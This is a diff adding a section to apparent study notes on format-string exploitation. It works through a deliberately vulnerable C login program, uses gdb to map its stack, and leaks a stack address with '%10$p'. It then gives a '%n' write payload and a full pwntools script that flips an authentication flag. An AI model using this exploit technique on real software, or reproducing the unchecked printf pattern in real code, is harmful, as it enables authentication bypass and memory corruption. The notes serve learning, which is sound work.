@@ -992,3 +992,351 @@ Even though no arguments were passed, printf will:
 	•	and use whatever value happens to be there
 
 This is why `%11$p` worked for leaks.
+
+Let's consider this program
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+
+void grantAccess() {
+	printf("Access Granted\n");
+}
+
+void checkOtp(char* otp, int *isAuthenticated) {
+
+	if (strcmp(otp, "X7pA9kQ2") == 0) {
+		*isAuthenticated = 1;
+	}
+}
+
+
+void AuthenticateUser() {
+        
+    char username[8];
+	char otp[8];
+
+	int isAuthenticated = 0;
+
+    printf("Enter Username: ");
+	scanf("%s", username);
+
+	printf("Enter otp for: ");
+   	printf(username);
+	scanf("%s", otp);
+    printf("You entered otp: ");
+    printf(otp);
+
+	checkOtp(otp, &isAuthenticated);
+
+	if (isAuthenticated == 1) {
+		grantAccess();
+	} else {
+		printf("Authentication Failed\n");
+	}
+
+}
+
+int main() {
+	AuthenticateUser();
+}
+```
+
+It has two vulnerable `printf`'s. Our idea is to leak address of `isAuthenticated` with first one and overwrite `isAuthenticated` using `%n` in second one. 
+
+```bash
+$ gcc -O0 -o vuln  main2.c
+main2.c: In function ‘AuthenticateUser’:
+main2.c:28:16: warning: format not a string literal and no format arguments [-Wformat-security]
+   28 |         printf(username);
+      |                ^~~~~~~~
+main2.c:31:12: warning: format not a string literal and no format arguments [-Wformat-security]
+   31 |     printf(otp);
+      |            ^~~
+```
+
+The stack frame of `AuthenticateUser` looks like this
+
+```
+Higher addresses
+┌──────────────────────────────────────────┐
+│ rbp+8   │ Return address                 │
+├──────────────────────────────────────────┤
+│ rbp+0   │ Saved RBP                      │
+├──────────────────────────────────────────┤
+│ rbp-0x8 │ Stack Canary (8 bytes)         │
+│         │  ends with 0x00  ← intentional │
+├──────────────────────────────────────────┤
+│ rbp-0x10│ otp[8]                         │
+├──────────────────────────────────────────┤
+│ rbp-0x18│ username[8]                    │
+├──────────────────────────────────────────┤
+│ rbp-0x1c│ isAuthenticated (int, 4 bytes) │
+├──────────────────────────────────────────┤
+│ rbp-0x20│ Padding (4 bytes, alignment)   │
+└──────────────────────────────────────────┘
+Lower addresses
+```
+
+So the address of `isAuthenticated` can be obtained by address of `username - 0x4`. We can leak the address of `username` first by printing the first argument to `printf` that is present in `rdi`. 
+
+Unfortunately this idea of leaking `username` doesn't work. 
+
+```bash
+Breakpoint 2, 0x000055555555528f in AuthenticateUser () at main2.c:28
+28	   	printf(username);
+(gdb) info registers rdi rsi rdx rcx r8 r9
+rdi            0x7fffffffde98      140737488346776
+rsi            0x746f207265746e45  8389960306515013189
+rdx            0x0                 0
+rcx            0x0                 0
+r8             0xa                 10
+r9             0xffffffff          4294967295
+(gdb) p &username
+$1 = (char (*)[8]) 0x7fffffffde98
+(gdb)
+$2 = (char (*)[8]) 0x7fffffffde98
+```
+
+Because although `&username` is present in `rdi`, `printf`'s va_list starts from `rsi`. Still `rsi` should've contained `&username` because previously `scanf` had written to it
+
+```bash
+Dump of assembler code for function AuthenticateUser:
+   0x000055555555521e <+0>:	endbr64
+   0x0000555555555222 <+4>:	push   rbp
+   0x0000555555555223 <+5>:	mov    rbp,rsp
+   0x0000555555555226 <+8>:	sub    rsp,0x20
+=> 0x000055555555522a <+12>:	mov    rax,QWORD PTR fs:0x28
+   0x0000555555555233 <+21>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000555555555237 <+25>:	xor    eax,eax
+   0x0000555555555239 <+27>:	mov    DWORD PTR [rbp-0x1c],0x0
+   0x0000555555555240 <+34>:	lea    rax,[rip+0xdd5]        # 0x55555555601c
+   0x0000555555555247 <+41>:	mov    rdi,rax
+   0x000055555555524a <+44>:	mov    eax,0x0
+   0x000055555555524f <+49>:	call   0x5555555550b0 <printf@plt>
+   0x0000555555555254 <+54>:	lea    rax,[rbp-0x18]
+   0x0000555555555258 <+58>:	mov    rsi,rax
+   0x000055555555525b <+61>:	lea    rax,[rip+0xdcb]        # 0x55555555602d
+   0x0000555555555262 <+68>:	mov    rdi,rax
+   0x0000555555555265 <+71>:	mov    eax,0x0
+   0x000055555555526a <+76>:	call   0x5555555550d0 <__isoc99_scanf@plt>
+   0x000055555555526f <+81>:	lea    rax,[rip+0xdba]        # 0x555555556030
+   0x0000555555555276 <+88>:	mov    rdi,rax
+   0x0000555555555279 <+91>:	mov    eax,0x0
+   0x000055555555527e <+96>:	call   0x5555555550b0 <printf@plt>
+   0x0000555555555283 <+101>:	lea    rax,[rbp-0x18]
+   0x0000555555555287 <+105>:	mov    rdi,rax
+   0x000055555555528a <+108>:	mov    eax,0x0
+   0x000055555555528f <+113>:	call   0x5555555550b0 <printf@plt>
+   0x0000555555555294 <+118>:	lea    rax,[rbp-0x10]
+   0x0000555555555298 <+122>:	mov    rsi,rax
+   0x000055555555529b <+125>:	lea    rax,[rip+0xd8b]        # 0x55555555602d
+```
+
+But somewhere in between it was modified by libc, since its not callee restored, we lost that value, but anyway this approach was not reliable. 
+
+#### Alternate way of leaking a stack address
+
+Our goal is not to leak the exact address of `isAuthenticated`, we need to leak any stack address. Since the stack layout is predictable, we can derive all other addresses using the found address. Since our previous attempt of leaking `username` failed, the only other stack address lying on stack itself is **saved rbp** of main. 
+
+```bash
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0000555555555321 <+0>:	endbr64
+   0x0000555555555325 <+4>:	push   rbp
+   0x0000555555555326 <+5>:	mov    rbp,rsp
+   0x0000555555555329 <+8>:	mov    eax,0x0
+   0x000055555555532e <+13>:	call   0x55555555521e <AuthenticateUser>
+   0x0000555555555333 <+18>:	mov    eax,0x0
+   0x0000555555555338 <+23>:	pop    rbp
+   0x0000555555555339 <+24>:	ret
+End of assembler dump.
+```
+
+There is no space allocate for main's stack frame. This is it.
+
+```bash
+Higher addresses
+┌──────────────────────────┐
+│ return address to _start │  ← [rbp+8]
+├──────────────────────────┤
+│ saved rbp (from _start)  │  ← [rbp]
+└──────────────────────────┘
+Lower addresses
+```
+
+So `isAuthenticated` is at `main's rbp - 0x2C`  (44 bytes).
+
+Since saved RBP is 32 bytes below `rsp`, we need to leak the 4th argument on stack, i.e., 6 (registers) + 4 = 10th argument.
+
+```bash
+$ ./vuln
+Enter Username: %10$p
+Enter otp for: 0x7fff0093a0e0
+```
+
+So address of `isAuthenticated` is `0x7fff0093a0e0 - 0x2C = 0x7fff0093a0b4`
+
+#### Overwriting the `isAuthenticated`
+
+If we attempt to build the payload like `[ address of isAuthenticated (8 bytes) ][ %8$n ]`
+
+We will end up overwriting the stack canary since the buffer is more than 8 bytes and the `otp` variable is right next to the canary. But the even bigger problem is userspace addresses look like this in linux `0x00007fffffffdec0`
+
+```
+0x00007fffffffdec0
+  ^^^^
+  These are ALWAYS null bytes!
+```
+
+This is because:
+
+- x64 uses 64-bit addresses (8 bytes)
+- But only 48 bits are actually used for virtual addresses
+- The upper 16 bits are always zero (canonical addressing)
+
+When we write it into memory in little endian it will look like this
+
+```
+0x7fffffffdea0:	0x94	0xde	0xff	0xff	0xff	0x7f	0x00	0x00
+```
+
+The issue here is `printf` stops processing at null bytes and never reaches the format arguments. 
+
+To overcome this, we need to build payload in this format
+
+```
+[padding/format_string] [address_at_the_end]
+```
+
+Now the actual otp string moved by 8 bytes, we change 8 to 9. Payload will look like `'%9$nXXXX' + '0x7fffffffde94'`
+
+And since the value of `isAuthenticated` need to be exactly `1`, we will change the argument to `h%9$nXXX`, now it will print one character `h` and sees `%9$n`, then it moves the `arg_ptr` to where `otp` string is present, but its value is the address of `isAuthenticated`. So it will dereference that address and ends up wriiting 1 there. 
+
+pwntools script for same
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import re
+
+context.binary = "./vuln"
+context.log_level = "debug"
+
+def main():
+    print("[*] Launching process")
+    p = process("./vuln", stdin=PTY, stdout=PTY)
+
+    # -------------------------
+    # Stage 1: Leak main RBP
+    # -------------------------
+    print("[*] Waiting for Username prompt")
+    p.recvuntil(b"Enter Username: ")
+
+    print("[*] Sending format string leak")
+    p.sendline(b"%10$p")
+
+    print("[*] Reading leak output")
+    data = p.recvuntil(b"Enter otp for: ", timeout=2)
+    data += p.recv(timeout=0.2)   # <-- CRITICAL: drain inline leak
+
+    print(f"[DEBUG] Full leak buffer:\n{data}")
+
+    leaks = re.findall(rb"0x[0-9a-fA-F]+", data)
+    if not leaks:
+        log.failure("Failed to extract leaked RBP")
+        p.close()
+        return
+
+    main_rbp = int(leaks[0], 16)
+    log.success(f"Leaked main RBP: {hex(main_rbp)}")
+
+    # -------------------------
+    # Stage 2: Calculate target
+    # -------------------------
+    is_auth = main_rbp - 0x2c
+    log.success(f"isAuthenticated @ {hex(is_auth)}")
+
+    # -------------------------
+    # Stage 3: %n payload
+    # -------------------------
+    payload  = b"h"          # prints 1 byte
+    payload += b"%9$n"       # writes 1 to *(arg9)
+    payload += b"XXX"
+    payload += p64(is_auth)
+    payload += b"\n"
+
+    print(f"[DEBUG] Payload bytes: {payload}")
+
+    # -------------------------
+    # Stage 4: Trigger write
+    # -------------------------
+    print("[*] Sending OTP payload")
+    p.send(payload)
+
+    # -------------------------
+    # Stage 5: Read result
+    # -------------------------
+    out = p.recvall(timeout=1)
+    print("[*] Program output:")
+    print(out.decode(errors="ignore"))
+
+    if b"Access Granted" in out:
+        print("[+] SUCCESS")
+    else:
+        print("[-] FAILURE")
+
+    p.close()
+
+if __name__ == "__main__":
+    main()
+```
+
+```bash
+[*] '/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[*] Launching process
+[+] Starting local process './vuln' argv=[b'./vuln'] : pid 9369
+[*] Waiting for Username prompt
+[DEBUG] Received 0x10 bytes:
+    b'Enter Username: '
+[*] Sending format string leak
+[DEBUG] Sent 0x6 bytes:
+    b'%10$p\n'
+[*] Reading leak output
+[DEBUG] Received 0x1d bytes:
+    b'Enter otp for: 0x7ffc5e8deac0'
+[DEBUG] Full leak buffer:
+b'Enter otp for: 0x7ffc5e8deac0'
+[+] Leaked main RBP: 0x7ffc5e8deac0
+[+] isAuthenticated @ 0x7ffc5e8dea94
+[DEBUG] Payload bytes: b'h%9$nXXX\x94\xea\x8d^\xfc\x7f\x00\x00\n'
+[*] Sending OTP payload
+[DEBUG] Sent 0x11 bytes:
+    00000000  68 25 39 24  6e 58 58 58  94 ea 8d 5e  fc 7f 00 00  │h%9$│nXXX│···^│····│
+    00000010  0a                                                  │·│
+    00000011
+[+] Receiving all data: Done (86B)
+[DEBUG] Received 0x56 bytes:
+    00000000  59 6f 75 20  65 6e 74 65  72 65 64 20  6f 74 70 3a  │You │ente│red │otp:│
+    00000010  20 68 58 58  58 94 ea 8d  5e fc 7f 41  63 63 65 73  │ hXX│X···│^··A│cces│
+    00000020  73 20 47 72  61 6e 74 65  64 0a 2a 2a  2a 20 73 74  │s Gr│ante│d·**│* st│
+    00000030  61 63 6b 20  73 6d 61 73  68 69 6e 67  20 64 65 74  │ack │smas│hing│ det│
+    00000040  65 63 74 65  64 20 2a 2a  2a 3a 20 74  65 72 6d 69  │ecte│d **│*: t│ermi│
+    00000050  6e 61 74 65  64 0a                                  │nate│d·│
+    00000056
+[*] Stopped process './vuln' (pid 9369)
+[*] Program output:
+You entered otp: hXXX^\x7fAccess Granted
+*** stack smashing detected ***: terminated
+
+[+] SUCCESS
+```
